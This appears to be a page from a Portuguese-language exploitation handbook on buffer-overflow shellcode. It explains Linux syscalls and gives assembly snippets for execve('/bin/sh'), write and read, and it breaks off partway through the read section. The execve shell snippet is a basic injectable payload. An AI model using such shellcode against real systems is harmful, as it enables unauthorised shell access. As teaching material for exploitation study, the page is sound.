<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-pwning/bof/2-3-bof-shellcode" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Buffer Overflow - Shellcode | CatchTheFox</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://ariiialves.github.io/manual-pwning/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://ariiialves.github.io/manual-pwning/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-3-bof-shellcode"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Buffer Overflow - Shellcode | CatchTheFox"><meta data-rh="true" name="description" content="Shellcode é um pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode."><meta data-rh="true" property="og:description" content="Shellcode é um pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode."><link data-rh="true" rel="icon" href="/manual-pwning/img/logo.ico"><link data-rh="true" rel="canonical" href="https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-3-bof-shellcode"><link data-rh="true" rel="alternate" href="https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-3-bof-shellcode" hreflang="en"><link data-rh="true" rel="alternate" href="https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-3-bof-shellcode" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Pwning","item":"https://ariiialves.github.io/manual-pwning/docs/pwning/beginning"},{"@type":"ListItem","position":2,"name":"Buffer Overflow","item":"https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-0-bof"},{"@type":"ListItem","position":3,"name":"Buffer Overflow - Shellcode","item":"https://ariiialves.github.io/manual-pwning/docs/pwning/bof/2-3-bof-shellcode"}]}</script><link rel="alternate" type="application/rss+xml" href="/manual-pwning/blog/rss.xml" title="CatchTheFox RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/manual-pwning/blog/atom.xml" title="CatchTheFox Atom Feed"><link rel="stylesheet" href="/manual-pwning/assets/css/styles.9a6cb60f.css">
<script src="/manual-pwning/assets/js/runtime~main.b3daaea2.js" defer="defer"></script>
<script src="/manual-pwning/assets/js/main.4d9f3628.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")),document.documentElement.setAttribute("data-theme-choice",t||"system")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/manual-pwning/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/manual-pwning/"><div class="navbar__logo"><img src="/manual-pwning/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/manual-pwning/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">CatchTheFox</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/manual-pwning/docs/intro">HandBook</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/ariiialves/manual-pwning" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/manual-pwning/docs/intro"><span title="Bem vindo" class="linkLabel_WmDU">Bem vindo</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/manual-pwning/docs/introduction/beginning"><span title="Introdução" class="categoryLinkLabel_W154">Introdução</span></a><button aria-label="Expand sidebar category &#x27;Introdução&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/manual-pwning/docs/pwning/beginning"><span title="Pwning" class="categoryLinkLabel_W154">Pwning</span></a><button aria-label="Collapse sidebar category &#x27;Pwning&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/1-1-protections"><span title="Proteções de binários" class="linkLabel_WmDU">Proteções de binários</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/manual-pwning/docs/pwning/bof/2-0-bof"><span title="Buffer Overflow" class="categoryLinkLabel_W154">Buffer Overflow</span></a><button aria-label="Collapse sidebar category &#x27;Buffer Overflow&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/bof/2-1-bof-variables"><span title="Buffer Overflow - Variáveis" class="linkLabel_WmDU">Buffer Overflow - Variáveis</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/bof/2-2-bof-callfunction"><span title="Buffer Overflow - Return Address" class="linkLabel_WmDU">Buffer Overflow - Return Address</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/manual-pwning/docs/pwning/bof/2-3-bof-shellcode"><span title="Buffer Overflow - Shellcode" class="linkLabel_WmDU">Buffer Overflow - Shellcode</span></a></li></ul></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/format-strings"><span title="Format Strings" class="linkLabel_WmDU">Format Strings</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/array-indexing"><span title="Array indexing" class="linkLabel_WmDU">Array indexing</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/integer-overflow"><span title="Integer Overflow" class="linkLabel_WmDU">Integer Overflow</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/bad-seed"><span title="Bad Seed" class="linkLabel_WmDU">Bad Seed</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/manual-pwning/docs/pwning/z3"><span title="Z3 &amp; Symbolic Execution (angr)" class="linkLabel_WmDU">Z3 &amp; Symbolic Execution (angr)</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/manual-pwning/docs/pwning/rop/8-1-rop"><span title="ROP (Return-Oriented Programming)" class="categoryLinkLabel_W154">ROP (Return-Oriented Programming)</span></a><button aria-label="Expand sidebar category &#x27;ROP (Return-Oriented Programming)&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/manual-pwning/docs/fast-food/beginning"><span title="Fast Food" class="categoryLinkLabel_W154">Fast Food</span></a><button aria-label="Expand sidebar category &#x27;Fast Food&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/manual-pwning/docs/extra/intro"><span title="Material extra" class="categoryLinkLabel_W154">Material extra</span></a><button aria-label="Expand sidebar category &#x27;Material extra&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/manual-pwning/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/manual-pwning/docs/pwning/beginning"><span>Pwning</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/manual-pwning/docs/pwning/bof/2-0-bof"><span>Buffer Overflow</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Buffer Overflow - Shellcode</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Buffer Overflow - Shellcode</h1></header><p>Shellcode é um <strong>pequeno trecho de código em Assembly usado como payload (carga útil) em um ataque</strong>. O código é muito pequeno por ser em assembly, portanto apenas poucos bytes são necessários, dependendo do shellcode.</p>
<p>Com shellcode, <strong>fazemos o programa rodar funcionalidades que o programador não escreveu</strong>. Normalmente, shellcode é utilizado para fazer uma chamada de API do Windows ou Syscall no Linux.</p>
<p>No C, estaríamos fazendo algo como:</p>
<div class="language-C language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">system</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;/bin/sh&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// Chama shell</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>O Shellcode é a versão compacta disso, em assembly, que pode ser injetada na memória através de um input. Ou seja, <strong>Shellcode é código Assembly normal</strong>, nada especial. É chamado de shellcode pois geralmente envolve abrir uma shell (interface entre usuário e serviços do sistema operacional, algo como o prompt de comando do Windows).</p>
<p>A razão pela qual Shellcode funciona é por que <strong>o computador não diferencia dados e instruções</strong>. Não importa onde ou como você fala para rodar, o computador VAI tentar rodar. Assim, colocamos o shellcode na Stack e falamos para a <code>RIP</code> executar aquilo.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="o-que-colocar-no-shellcode">O que colocar no shellcode?<a href="#o-que-colocar-no-shellcode" class="hash-link" aria-label="Direct link to O que colocar no shellcode?" title="Direct link to O que colocar no shellcode?" translate="no">​</a></h2>
<p>Podemos escrever várias coisas em assembly que são úteis como código injetável. Entre elas, temos:</p>
<ol>
<li class=""><strong>Syscall (Linux/Unix)</strong> - O mais comum. Fazemos chamadas diretas ao kernel via instrução <code>syscall / int 0x80</code>. É simples, não depende de bibliotecas específicas e permite acessar todas as funcionalidades do Kernel.</li>
<li class=""><strong><a class="" href="/manual-pwning/docs/pwning/rop/8-1-rop">ROP (Return-Oriented Programming)</a></strong> - Reutilizar códigos do próprio programa encadeados para ação maliciosa</li>
<li class=""><strong>Chamada de API Windows</strong> - Usamos as APIs do SO Windows ao invés de syscalls, pois as syscalls do Windows não são públicas.</li>
<li class=""><strong>Exploração de Browser</strong> - JavaScript/WebAssembly que explora vulnerabilidades no renderizador. Tende a ser bem complexo, pois explora bugs no motor do JS.</li>
</ol>
<p>Iremos focar em <strong>Syscalls</strong> e <strong>ROP</strong>.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="syscalls">Syscalls<a href="#syscalls" class="hash-link" aria-label="Direct link to Syscalls" title="Direct link to Syscalls" translate="no">​</a></h2>
<p>Syscalls são interfaces de fácil uso que <strong>permitem que programas solicitem serviços do kernel do sistema operacional</strong>, como <strong>acesso a hardware</strong>, <strong>criação de processos</strong>, <strong>gerenciamento de arquivos</strong>, etc. Para fazer uma syscall damos o <strong>número da syscall</strong> (operação que queremos), os <strong>argumentos</strong> e em seguida usamos o <strong>comando syscall (x64) / int 0x80 (x86)</strong>, como vemos abaixo.</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">;x86-64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, syscall_number  ; Número da syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, arg1            ; Primeiro argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rsi, arg2            ; Segundo argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, arg3            ; Terceiro argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r10, rcx             ; Quarto argumento (rcx não usado)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r8, r8               ; Quinto argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov r9, r9               ; Sexto argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall                  ; Instrução para chamar o kernel</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; x86</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov eax, syscall_number  ; Número da syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ebx, arg1            ; Primeiro argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ecx, arg2            ; Segundo argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov edx, arg3            ; Terceiro argumento</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int 0x80                 ; Interrupção para chamar o kernel</span><br></span></code></pre></div></div>
<p>Vamos falar de algumas syscalls importantes.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="execve---executar-shellprograma">execve - Executar Shell/programa<a href="#execve---executar-shellprograma" class="hash-link" aria-label="Direct link to execve - Executar Shell/programa" title="Direct link to execve - Executar Shell/programa" translate="no">​</a></h3>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 11</li>
<li class=""><code>x64</code> - 59</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Executa /bin/sh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 59           ; syscall número 59 = execve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rdi, [rel bin_sh] ; arg1: pathname = &quot;/bin/sh&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rsi, rsi          ; arg2: argv = NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xor rdx, rdx          ; arg3: envp = NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bin_sh: db &#x27;/bin/sh&#x27;,0       ;(mude o caminho para executar outros programas)</span><br></span></code></pre></div></div>
<p>Exemplo:</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">section .data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    path db &#x27;/bin/ls&#x27;, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    arg0 db &#x27;/bin/ls&#x27;, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    arg1 db &#x27;-l&#x27;, 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    args dq arg0, arg1, 0  ; Array de argumentos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">section .text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">global _start</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">_start:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mov rax, 59        ; execve syscall</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea rdi, [path]    ; caminho do programa</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lea rsi, [args]    ; argumentos</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor rdx, rdx       ; envp = NULL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    syscall</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="file-descriptors-fd">File Descriptors (fd)<a href="#file-descriptors-fd" class="hash-link" aria-label="Direct link to File Descriptors (fd)" title="Direct link to File Descriptors (fd)" translate="no">​</a></h3>
<p>File Descriptor é um número que representa um arquivo aberto. STDIN, STDOUT, STDERR são padrões do sistema, e os fd&#x27;s de arquivos e sockets são atribuídos conforme necessidade.</p>
<ul>
<li class=""><code>STDIN (0)</code>  → Para RECEBER coisas. Normalmente teclado.</li>
<li class=""><code>STDOUT (1)</code> → Para ENVIAR coisas. Normalmente tela/monitor.</li>
<li class=""><code>STDERR (2)</code> → Para RECLAMAR de erros. Normalmente tela/monitor.</li>
<li class=""><code>Arquivo (X)</code> → Para arquivo específico criado.</li>
<li class=""><code>Socket (X)</code> → Para socket criado que permite se comunicar pela internet.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="write---saídaescrita">write - Saída/Escrita<a href="#write---saídaescrita" class="hash-link" aria-label="Direct link to write - Saída/Escrita" title="Direct link to write - Saída/Escrita" translate="no">​</a></h3>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 4</li>
<li class=""><code>x64</code> - 1</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Escreve em arquivo/socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 1       ; write</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 1       ; fd (1=stdout, 4=socket)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rsi, [msg]   ; buffer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, len     ; tamanho</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span></code></pre></div></div>
<p>Exemplo:</p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; write(&quot;Hello\n&quot;, 6)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 1       ; syscall 1 = write</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 1       ; fd = STDOUT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rsi, hello   ; string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 6       ; length</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall          ; chamada</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hello: db &#x27;Hello&#x27;, 0x0a</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="read---entradaleitura">read - Entrada/Leitura<a href="#read---entradaleitura" class="hash-link" aria-label="Direct link to read - Entrada/Leitura" title="Direct link to read - Entrada/Leitura" translate="no">​</a></h3>
<p>Código para cada arquitetura:</p>
<ul>
<li class=""><code>x86</code> - 3</li>
<li class=""><code>x64</code> - 0</li>
</ul>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Lê de entrada/socket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rax, 0       ; read</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdi, 0       ; fd (0=stdin, 4=socket)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea rsi, [buf]   ; buffer</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov rdx, 1024    ; tamanho máximo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syscall</span><br></span></code></pre></div></div>
<p>Exemplo:</p>
